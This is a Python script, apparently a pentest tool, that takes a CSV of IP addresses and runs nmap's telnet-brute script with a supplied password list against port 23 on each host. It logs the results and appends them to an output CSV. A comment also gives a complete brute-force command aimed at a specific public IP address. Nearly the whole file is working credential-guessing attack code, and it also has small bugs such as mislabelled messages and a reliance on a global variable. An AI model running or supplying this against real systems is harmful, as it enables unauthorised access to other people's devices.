#!/root/anaconda3/envs/pentest/bin/python

import nmap
import sys
import time
import sh
import pandas as pd
import re
import sys
#Read a csv into a dataframe
csv_path = sys.argv[1]
df = pd.read_csv(csv_path)
creds = sys.argv[2]
output_path = sys.argv[3]

#COMMAND TO USE
# nmap --script telnet-brute --script-args=brute.mode=pass,passdb=./creds-passonly-nmap.lst,brute.threads=1,brute.start=1,brute.passonly=true,telnet-brute.timeout=10s,unpwdb.timelimit=20s -d -v -T2 -p 23 63.247.4.229

# CREATING FUNCTIONS
def telnet_brute(ipaddress,creds=None):
#     if userdb == None:
#         userdb = '/usr/share/nmap/nselib/data/usernames.lst' #pass the default lists if none is supplied
#     if passdb == None:
#         passdb = '/usr/share/nmap/nselib/data/passwords.lst' #default passwords list
    scanner = nmap.PortScanner()
    targets = []
    #ftp-brute will attempt a guess for every password in the passdb list for each username
    #userdb/passdb is used to supply my own password list or the default will be used 
    #brute.emptypass=True will attempt empty passwords
    #username as passwords guessing is on by default. Supply an empty passdb list and only this will be executed
    scan1 = scanner.scan(hosts=ipaddress, arguments=f'''
        --script "telnet-brute"
        --script-args=brute.mode=pass,passdb={creds},brute.threads=1,brute.start=1,brute.passonly=true,telnet-brute.timeout=10s,unpwdb.timelimit=20s
        -d -v -T2 -p 23
        ''')#scan for ftp vulns using the scripts and attach associated arguments for them as needed
    xml = scanner.get_nmap_last_output()    #GET XML OUTPUT
    try:
        df1 = pd.DataFrame(scan1)
        a = scanner.command_line()
        b = scanner.scaninfo()
        c = scanner.scanstats()
        d = scanner.all_hosts() #gets ip address
        s = scan1['scan']

        f = [d[0],a,b,c,s] #Add any values and then add a column name for it inside the columns 
        df2 = pd.DataFrame([f], columns=['IP','cmdLine','scaninfo','scanStats','scanData']) #make df of the d list holding the ip address to append to my df
    #EXTRACT THE SCANDATA FIELDS AND PRINT IT
        cmdline = df2['cmdLine'][0]
        scaninfo = df2['scaninfo'][0]
        hostnames = df2['scanData'][0][d[0]]['hostnames']
        addresses = df2['scanData'][0][d[0]]['addresses']
        vendor = df2['scanData'][0][d[0]]['vendor']
        status = df2['scanData'][0][d[0]]['status']
        print("Elapsed Time:",df2['scanStats'][0]['elapsed']) #You can still pull keys out from the stored DF data even!
        print(f"IP/MAC: {addresses}")
        print(f"status: {status}")
        print(f"vendor: {vendor}")
        print(f"Hostnames: {hostnames}")
        print(f"{d}")
        print(f"command: {cmdline}\nscaninfo: {scaninfo}")
        return df1,df2,xml #returning three variables in form of a tuple 
    except Exception as e:
        print(e)
        
def telnet_nse_data(df):
#CHECK FTP SCAN DATA(must run after scan)
    import pprint
    pp = pprint.PrettyPrinter(indent=1)
    ip = df['IP'][0] #pulls the ip used in the scan
    a = df['scanData'][0][ip]["tcp"][23]
    #Get only the Telnet script Data
#     b = df['scanData'][0][ip]["tcp"][21]['script'] #displays 
    print('\n')
    pp.pprint(a)
#     print(f"{a}\n\n{b}")

def get_script_output(df2):
    try:
        a = df2['scanData'][0][ipaddress]["tcp"][23]['script'] #make sure the "ipaddress" stays the same when putting it into the main http_brute function so when it passes it picks up the script properties properly
    except Exception as e:
        print(e)
        a = "80 is N/A"
    try:
        b = df2['scanData'][0][ipaddress]["tcp"][8080]['script']
    except Exception as e:
        print()
        b = "8080 is N/A"
    try:
        c = df2['scanData'][0][ipaddress]["tcp"][443]['script']
    except Exception as e:
        print(e)
        c = "443 is N/A"
    d = f'{str(a)} {str(b)} {str(c)}'
    print(d,"\n")
    return(d)

#Brute all hosts were identified with port 23 being open with functions above

brute_log='/root/pentests/telnet/brutelog.txt'
# passdb = None #will use default list of 5000 common passwords
script_details = []
for ipaddress in df['IPv4']:
    try:
        print(f'Brute Forcing {ipaddress} with {creds}')
        df1,df2,xml = telnet_brute(ipaddress,creds)
        print(f'{telnet_nse_data(df2)}\n')
        d = get_script_output(df2)
    except Exception as e:
        print(f"failed due to: {e}")
        pass
    script_details.append(d)
    with open(brute_log, 'a+') as file:
            file.write(f'{ipaddress}{d}\n\n')
#APPEND COLUMN OF BRUTE DETAILS TO CSV
df['Brute_Results'] = script_details

print(f"Results are being written to {output_path}")
df.to_csv(output_path)
